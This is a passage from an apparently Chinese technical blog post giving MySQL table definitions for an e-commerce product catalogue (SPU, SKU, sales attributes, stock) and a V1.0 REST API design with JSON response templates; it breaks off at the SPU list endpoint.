<span class="string">'售价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`market_price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`market_price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> AUTO_INCREMENT=<span class="number">666666</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'spu表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sku表 product_sku</span></span><br><span class="line"><span class="comment">-- sku: stock keeping unit 库存量单位</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_sku`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`spu_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`attrs`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值&#123;attr_value_id&#125;-&#123;attr_value_id&#125; 多个销售属性值逗号分隔'</span>,</span><br><span class="line">    <span class="string">`banner_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'banner图片 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`main_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'商品介绍主图 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`market_price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`market_price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> AUTO_INCREMENT=<span class="number">666666</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'sku表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 销售属性表 product_attr</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_attr`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性描述'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'销售属性表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 销售属性值 product_attr_value</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_attr_value`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'销售属性值ID'</span>,</span><br><span class="line">    <span class="string">`attr_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`value`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值描述'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'销售属性值'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 关联关系冗余表 product_spu_sku_attr_map</span></span><br><span class="line"><span class="comment">-- 1. spu下 有哪些sku</span></span><br><span class="line"><span class="comment">-- 2. spu下 有那些销售属性</span></span><br><span class="line"><span class="comment">-- 3. spu下 每个销售属性对应的销售属性值(一对多)</span></span><br><span class="line"><span class="comment">-- 4. spu下 每个销售属性值对应的sku(一对多)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_spu_sku_attr_map`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`spu_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`sku_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`attr_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性ID'</span>,</span><br><span class="line">    <span class="string">`attr_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性名称'</span>,</span><br><span class="line">    <span class="string">`attr_value_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值ID'</span>,</span><br><span class="line">    <span class="string">`attr_value_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'关联关系冗余表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sku库存表 product_sku_stock</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_sku_stock`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增ID'</span>,</span><br><span class="line">    <span class="string">`sku_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`quantity`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'库存'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'sku库存表'</span>;</span><br></pre></td></tr></table></figure>

<h3 id="接口设计-1"><a href="#接口设计-1" class="headerlink" title="接口设计"></a>接口设计</h3><p>关于接口设计目前很简单，无非列表和详情。但是这里我做了一个很好的设计<strong>动静分离</strong>，例如库存的动态的数据，单独提供接口，其他列表和详情数据完全静态化，把流量打到CDN去，这里又会说到我们下步计划的基础服务体系里的「静态资源服务」，这个服务的主要功能就是把我们的接口数据静态化。具体的<strong>V1.0</strong>版的接口设计如下：</p>
<p>1、spu详情 GET {version}/product/spu/{spu_id}</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>spu_id</td>
<td>number</td>
<td>yes</td>
<td>spu ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"brand_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, 品牌ID"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 品牌名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, 品牌描述"</span>,</span><br><span class="line">            <span class="attr">"logo_url"</span>: <span class="string">"string, 品牌logo图片"</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"category_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, 分类ID"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, 品牌名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, 品牌描述"</span>,</span><br><span class="line">            <span class="attr">"pic_url"</span>: <span class="string">"string, 分类图片"</span>,</span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"string, 分类地址&#123;pid&#125;-&#123;child_id&#125;-..."</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"spu_info"</span>: &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"number, spu id"</span>,</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"string, spu名称"</span>,</span><br><span class="line">            <span class="attr">"desc"</span>: <span class="string">"string, spu描述"</span>,</span><br><span class="line">            <span class="attr">"selling_point"</span>: <span class="string">"string, 卖点"</span>,</span><br><span class="line">            <span class="attr">"unit"</span>: <span class="string">"string, spu单位"</span>,</span><br><span class="line">            <span class="attr">"banner_url"</span>: [</span><br><span class="line">                <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">                <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"main_url"</span>: [</span><br><span class="line">                <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">                <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">            <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">            <span class="attr">"attrs"</span>: [ // 有那些销售属性</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"销售属性ID"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"string, 销售属性名称"</span>,</span><br><span class="line">                    <span class="attr">"desc"</span>: <span class="string">"string, 销售属性描述"</span>,</span><br><span class="line">                    <span class="attr">"values"</span>: [ // 每个销售属性对应的销售属性值(一对多)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">"id"</span>: <span class="string">"销售属性值ID"</span>,</span><br><span class="line">                            <span class="attr">"name"</span>: <span class="string">"string, 销售属性值"</span>,</span><br><span class="line">                            <span class="attr">"desc"</span>: <span class="string">"string, 销售属性值描述"</span>,</span><br><span class="line">                            // 每个销售属性值对应的sku(一对多)</span><br><span class="line">                            // 页面初始化时，按钮不可点击逻辑判断： 如果该销售属性值下所有sku没有库存，则该销售属性按钮不可点击</span><br><span class="line">                            // 选择销售属性值时，按钮不可点击逻辑判断：销售属性构成双向链表，每个销售属性又是一个单向链表存改销售属性对应的所有销售属性值。每当选择一个销售属性值时先前和后一个销售属性遍历，执销售属性值下所有sku售罄的按钮不可点击，且当前销售属性值map记录key为当前点击的销售属性值ID，值统一标示一下就行，目的记录是由于选择了哪个销售属性值使得当前的销售属性值为售罄状态</span><br><span class="line">                            // 取消选择销售属性值时，按钮不可点击逻辑恢复判断：数据结构同上，遍历，记录的map删除key为当前取消选中的销售属性值，并判断是否还有别的key使得该销售属性值为售罄状态，如果没有则恢复未售罄状态</span><br><span class="line">                            "skus": [</span><br><span class="line">                                "number, sku id",</span><br><span class="line">                                "number, sku id",</span><br><span class="line">                            ],</span><br><span class="line">                        &#125;</span><br><span class="line">                    ],</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            "skus": [ // 有哪些sku</span><br><span class="line">                "number, sku id",</span><br><span class="line">                "number, sku id",</span><br><span class="line">            ],</span><br><span class="line">            "skus_map": &#123;</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">                "&#123;attr_value_id&#125;-&#123;attr_value_id&#125;-...": "number, sku id",</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、获取spu下所有skus库存 GET {version}/stock/spu/{spu_id}</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>spu_id</td>
<td>number</td>
<td>yes</td>
<td>spu ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">            <span class="attr">"skus_stock"</span>: &#123;</span><br><span class="line">                <span class="attr">"int, sku id"</span>: &#123;</span><br><span class="line">                    <span class="attr">"quantity"</span>: <span class="string">"int, 剩余库存数量"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、sku详情 GET {version}/product/sku/{sku_id}</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>sku</td>
<td>number</td>
<td>yes</td>
<td>sku ID</td>
</tr>
</tbody></table>
<p>响应内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"OK"</span>,</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"number, sku id"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"string, sku名称"</span>,</span><br><span class="line">        <span class="attr">"desc"</span>: <span class="string">"string, sku描述"</span>,</span><br><span class="line">        <span class="attr">"unit"</span>: <span class="string">"string, sku单位"</span>,</span><br><span class="line">        <span class="attr">"banner_url"</span>: [</span><br><span class="line">            <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">            <span class="string">"string, banner 图片url"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"main_url"</span>: [</span><br><span class="line">            <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">            <span class="string">"string, 商品介绍主图 图片url"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"price"</span>: <span class="string">"string, 售价"</span>,</span><br><span class="line">        <span class="attr">"market_price"</span>: <span class="string">"string, 市场价"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、spu列表 GET {version}/product/spu/list</p>
<p>请求参数：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>是否必传</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
</tbody></table>
<p>响应内容：</p>
